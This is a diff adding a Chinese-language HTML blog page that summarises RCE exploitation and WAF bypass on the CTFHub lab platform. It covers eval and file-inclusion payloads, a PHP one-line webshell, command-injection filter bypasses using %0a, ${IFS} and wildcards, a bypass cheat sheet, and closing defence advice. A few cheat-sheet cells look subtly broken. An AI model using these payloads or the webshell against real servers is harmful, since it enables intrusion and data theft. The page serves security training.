@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【微方法论】Web RCE 漏洞基础利用与 WAF 绕过手法小结（基于CTFHub）</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        h3 { margin-top: 20px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+        table { border-collapse: collapse; width: 100%; margin-top: 15px; font-size: 0.95em; }
+        th, td { border: 1px solid #e1e4e8; padding: 8px; text-align: left; }
+        th { background-color: #f6f8fa; }
+        .note { background-color: #fff5b1; padding: 10px; border-left: 5px solid #f1c40f; margin: 15px 0; border-radius: 3px; font-size: 0.95em; }
+        .diff-box { background-color: #f1f8ff; border-left: 4px solid #0366d6; padding: 10px 15px; margin: 15px 0; border-radius: 4px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a ></p >
+    <h1>【微方法论】Web RCE 漏洞基础利用与 WAF 绕过手法小结（基于CTFHub）</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.9.26 | <strong>分类：</strong>Web安全 | <strong>标签：</strong>RCE, 命令注入, 文件包含, WAF绕过, 微方法论</p >
+    </div>
+
+    <h2>1. 简介与核心逻辑</h2>
+    <p>RCE（Remote Code Execution，远程代码执行）漏洞的本质，是服务器在处理用户输入时，没有进行严格的过滤与隔离，导致用户输入的字符串被当作<strong>系统命令</strong>或<strong>代码</strong>执行。这通常是 Web 安全中危害最大的漏洞之一，可直接导致服务器被完全接管。</p>
+    <p>本次实战的核心攻击逻辑为：<strong>寻找注入点 -> 探测服务器环境（翻找） -> 绕过防御机制（黑名单） -> 读取目标文件（Flag）。</strong></p>
+    <p>RCE 主要分为两大类：<strong>代码执行</strong>（如 PHP 的 <code>eval()</code>）和<strong>命令注入</strong>（如直接拼接 <code>system("ping -c 4 {$ip}")</code>）。文件包含漏洞（<code>include()</code>）虽属于代码执行，但往往需要借助 PHP 伪协议或 WebShell 来达成 RCE。</p>
+
+    <h2>2. 常见利用场景与具体翻找代码</h2>
+    
+    <h3>第一类：代码执行与文件包含（PHP 特性）</h3>
+    <p>目标是通过恶意 PHP 代码获取服务器控制权，或直接读取敏感文件。</p>
+    <ul>
+        <li><strong>直接代码执行（eval）：</strong>
+            <p>后端使用 <code>eval($_REQUEST['cmd']);</code>。输入必须是合法的 PHP 语句，且以分号结尾。</p>
+            <pre><code>// 探路与信息收集
+?cmd=phpinfo();
+// 执行系统命令
+?cmd=system('ls /');
+// 扫根目录（如果 system 被禁用）
+?cmd=print_r(scandir('/'));
+// 读取文件（绕过 system 禁用，防浏览器解析源码）
+?cmd=echo file_get_contents('/flag');
+?cmd=print_r(file_get_contents('/flag'));</code></pre>
+        </li>
+        <li><strong>文件包含（Include）与伪协议组合：</strong>
+            <p>后端使用 <code>include($_GET['file']);</code>，允许包含各类伪协议。</p>
+            <pre><code>// 1. php://filter (读取源码, 防解析)
+?file=php://filter/read=convert.base64-encode/resource=flag.php
+?file=php://filter/read=convert.base64-encode/resource=/flag
+
+// 2. php://input (执行 POST 中的代码，需配合 Burp)
+POST /?file=php://input HTTP/1.1
+...
+<?php system('ls /'); ?>
+
+// 3. data:// (空投代码，无需公网 VPS)
+?file=data://text/plain,<?php system('ls /'); ?>
+?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscyAvJyk7Pz4=
+
+// 4. 包含本地木马（配合双参数绕过）
+?file=shell.txt&ctfhub=system('cat /flag');
+// 如果 file 参数被强制要求 php:// 开头，可改用以下方式包含本地 txt 木马
+?file=php://filter/convert.base64-encode/resource=shell.txt // 不执行，仅读取
+// 或者利用条件竞争/日志包含等其他姿势</code></pre>
+        </li>
+    </ul>
+
+    <h3>第二类：命令注入（Linux Shell 特性）</h3>
+    <p>后端直接拼接系统命令。当常规字符被 WAF 拦截时，我们需要打出“组合拳”来完成<strong>探测、搜索、读取</strong>的完整流程。</p>
+    <ul>
+        <li><strong>【翻找阶段一：环境探测】</strong>
+            <pre><code>// 探测当前用户与系统
+127.0.0.1; whoami
+127.0.0.1; ls /
+127.0.0.1; ls -la  // 注意查看文件大小，排除 0 字节或几十字节的干扰空壳文件
+
+// 全盘搜索 flag 文件 (过滤系统伪文件报错)
+127.0.0.1; find / -name "flag*" 2>/dev/null
+127.0.0.1; find / -type f -name "flag*" -not -path "/sys/*" -not -path "/proc/*" 2>/dev/null
+
+// 已知内容特征的全局搜索 (终极杀招，直接在代码内容中找 flag 字符串)
+127.0.0.1; grep -rn "ctfhub" /var/www/html 2>/dev/null</code></pre>
+        </li>
+        <li><strong>【翻找阶段二：读取尝试与排错】</strong>
+            <pre><code>// 基础读取
+127.0.0.1; cat /flag
+// 强制显示错误信息（排查文件不存在/无权限）
+127.0.0.1; cat /flag 2>&1
+// 查看环境变量（常被用作假 Flag 陷阱或真 Flag 藏匿点）
+127.0.0.1; env
+// 内存取证（查看进程崩溃残留的核心转储文件中的明文）
+127.0.0.1; strings core.56 | grep -i flag</code></pre>
+        </li>
+        <li><strong>【翻找阶段三：终极绕过组合拳】</strong>
+            <p>假设同时过滤了：<code>;</code>、空格、<code>/</code>、<code>cat</code>、<code>flag</code>。</p>
+            <pre><code>// 1. 绕过命令分隔符：使用 %0a (必须用 Burp Suite 发送，防二次编码)
+127.0.0.1%0als
+// 2. 绕过空格：${IFS} 或 <
+127.0.0.1;cat${IFS}/flag
+127.0.0.1;cat</flag
+// 3. 绕过斜杠：${PATH:0:1} 或 ${PWD:0:1}
+127.0.0.1;cat${IFS}${PATH:0:1}flag
+// 4. 绕过关键字(cat)：tac, nl, base64, ca?
+127.0.0.1;tac /flag
+127.0.0.1;ca? /flag
+// 5. 绕过关键字(flag)：通配符 * 或 ?
+127.0.0.1;cat /f*
+127.0.0.1;cat /fla?
+
+// 【Payload 示例】（绕过所有黑名单，读取隐藏的真实 flag）
+// 场景：flag 在相对路径 flag_is_here 目录下，且文件名为 flag_xxx.php
+127.0.0.1%0abase64${IFS}f*_is_here${PATH:0:1}*
+// 解析: 换行符 + base64读取 + ${IFS}替代空格 + f*通配符绕过flag + ${PATH:0:1}替代/ + *通配符匹配目录下所有文件</code></pre>
+        </li>
+    </ul>
+
+    <h2>3. 常用工具获取与说明</h2>
+    <ul>
+        <li><b>Burp Suite 社区版：</b>RCE 实战的绝对核心。特别是在处理 <code>%0a</code>、<code>%00</code> 截断、修改 POST 请求体以及手动计算 <code>Content-Length</code> 时，浏览器地址栏会自作聪明地转义，只有 BP 的 Repeater 能完美发送原始字节流。</li>
+        <li><b>base64.us：</b>在线解码工具（<code>https://base64.us</code>）。在读取 PHP 源码时，由于 <code>&lt;?php // ... ?&gt;</code> 会被浏览器当成 HTML 隐藏，必须通过 <code>base64</code> 命令强转后，用它还原。</li>
+        <li><b>一句话木马（WebShell）：</b>文件包含/命令注入的得力助手。标准形态：<code>&lt;?php eval($_REQUEST['ctfhub']);?&gt;</code>，通过参数传递 PHP 代码或系统命令。</li>
+    </ul>
+
+    <h2>4. 经验总结与避坑指南</h2>
+    
+    <div class="note">
+        <strong>核心法则：盲打排错三板斧！</strong><br>
+        当命令执行没有回显时，不要怀疑自己。第一板斧：加上 <code>2>&1</code> 重定向标准错误（注意检查 <code>&</code> 是否被过滤，被过滤则需换其他排错法）。第二板斧：用 <code>ls -la</code> 摸清目录结构和文件大小，排除空壳文件。第三板斧：遇到 <code>.php</code> 文件一律使用 <code>base64</code> 命令强制读取，防浏览器解析。
+    </div>
+
+    <ul>
+        <li><b>不要主观臆测文件路径：</b>不要一上来就盲猜 <code>/flag</code> 或 <code>/flag/flag</code>。务必通过 <code>ls</code>、<code>find</code>、<code>grep</code> 一步步探明目录结构（如遇到 <code>flag_is_here</code> 目录）。</li>
+        <li><b>牢记 WAF 黑名单的漏网之鱼：</b>过滤是不彻底的。它过滤了 <code>cat</code>，却可能漏了 <code>tac</code>；过滤了 <code>;</code>，却漏了 <code>%0a</code>；过滤了 <code>/</code>，却漏了 <code>${PATH:0:1}</code>。熟记那张“终极绕过对照表”能省下大量时间。</li>
+        <li><b>警惕 PHP 的“隐身”特性：</b>直接 <code>cat</code> 一个 PHP 文件时，如果里面包含 <code>&lt;?php ... ?&gt;</code>，PHP 解析器会直接执行代码或忽略注释，导致输出为空。这就是为什么我们要养成用 <code>base64</code> 读源码的习惯。</li>
+        <li><b>本地测试与工具混合双打：</b>在复杂 Payload 提交前，可以先在本地 Linux 环境或在线 PHP 沙盒测试命令拼接、通配符展开逻辑，确保语法无误后再发送到靶场。</li>
+    </ul>
+
+    <h2>5. 安全防御建议</h2>
+    <ul>
+        <li><b>避免直接拼接系统命令与代码：</b>坚决杜绝将用户输入直接拼接到 <code>system()</code>、<code>exec()</code>、<code>eval()</code> 中。如果必须调用系统命令，使用白名单验证参数（如限制 IP 格式），或使用语言内置的安全 API（如 PHP 的 <code>escapeshellarg()</code>）。</li>
+        <li><b>限制文件包含功能：</b>在 php.ini 中关闭危险的配置项，如 <code>allow_url_include = Off</code> 和 <code>allow_url_fopen = Off</code>，阻断 <code>php://input</code> 和 <code>data://</code> 等伪协议的利用。</li>
+        <li><b>禁用高风险函数与命令：</b>在 PHP 配置中禁用 <code>eval</code>、<code>system</code>、<code>exec</code>、<code>shell_exec</code> 等危险函数。同时限制 Web 用户的系统权限，剥离上传目录的执行权限，确保即使被 RCE，攻击者也无法执行高危系统指令。</li>
+        <li><b>严格的输入过滤与转义：</b>对所有用户输入进行严格的特殊字符过滤（如 <code>;</code>、<code>|</code>、<code>&</code>、<code>$</code>、<code>`</code> 等），并在输出时进行编码转义。</li>
+    </ul>
+
+    <h2>附录：RCE 实战常用翻找命令速查表</h2>
+    <table>
+        <tr>
+            <th>目的</th>
+            <th>常规 Payload</th>
+            <th>绕过 Payload（假设黑名单为 <code>;</code> 空格 <code>/</code> <code>cat</code> <code>flag</code>）</th>
+        </tr>
+        <tr>
+            <td>执行命令</td>
+            <td><code>127.0.0.1; ls</code></td>
+            <td><code>127.0.0.1%0als</code></td>
+        </tr>
+        <tr>
+            <td>查找文件</td>
+            <td><code>find / -name "flag*"</code></td>
+            <td><code>find${IFS}/-name${IFS}"fla*"</code></td>
+        </tr>
+        <tr>
+            <td>读取文件</td>
+            <td><code>cat /flag</code></td>
+            <td><code>base64&lt;${PATH:0:1}fla?</code></td>
+        </tr>
+        <tr>
+            <td>查看错误</td>
+            <td><code>cat /flag 2>&1</code></td>
+            <td><code>cat&lt;/flag%0a2>&1</code> (需注意 `&` 是否被过滤，若被过滤则此路不通)</td>
+        </tr>
+        <tr>
+            <td>读取目录</td>
+            <td><code>ls -la</code></td>
+            <td><code>ls${IFS}-la</code></td>
+        </tr>
+    </table>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p >
+    </div>
+</body>
+</html>
